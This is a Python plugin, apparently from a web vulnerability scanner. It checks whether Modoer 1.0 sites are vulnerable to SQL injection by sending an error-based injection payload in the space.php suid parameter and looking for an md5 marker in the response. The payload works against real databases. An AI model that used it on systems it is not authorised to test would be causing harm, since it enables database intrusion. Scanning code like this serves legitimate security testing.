#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]                               
        detail=""
        detail=detail.encode('utf8')
        domain=ob['domain']
        url="space.php?suid=1%d5%27%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5(333),floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"
        url1="modoer/space.php?suid=1%d5%27%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5(333),floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)
        geturl1 ="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url1)     
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        if content.find("310dcbbf4cce62f762a2aaa148d556bd1")>=0:
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,geturl,ob['level'],detail,request,response))
        else:
            response,content=requestUrl(http,geturl1,ob['task_id'],ob['domain_id'])
            if content.find("310dcbbf4cce62f762a2aaa148d556bd1")>=0:
                request = getRequest(geturl1)
                response = getResponse(response)
                result.append(getRecord(ob,geturl1,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:modoer1_0sqlinjectionscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:modoer1_0sqlinjectionscript.py, run_domain function :" + str(e))
    return result